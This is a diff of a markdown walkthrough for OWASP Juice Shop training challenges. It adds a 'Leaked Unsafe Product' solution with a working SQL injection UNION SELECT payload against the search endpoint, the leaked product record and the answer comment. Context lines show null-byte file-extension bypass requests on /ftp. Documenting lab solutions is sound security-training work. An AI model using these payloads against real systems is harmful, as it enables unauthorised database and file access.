@@ -239,7 +239,15 @@ GET /ftp/suspicious_errors.yml%2500.md HTTP/1.1<br>
 http://localhost:3000/ftp<br>
 GET /ftp/package.json.bak%2500.md HTTP/1.1<br>
 
+### Leaked Unsafe Product
+burp suite > proxy > repeater
+GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1
+id":11,"name":"Rippertuer Special Juice","description":"Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br />This item has been made unavailable because of lack of safety standards. (This product is unsafe! We plan to remove it from the stock!)"
+https://pastebin.com/90dUgd7s
+http://localhost:3000/#/contact
+Comment: Hueteroneel Eurogium Edule
 
+### Legacy Typosquatting 
 
 
 
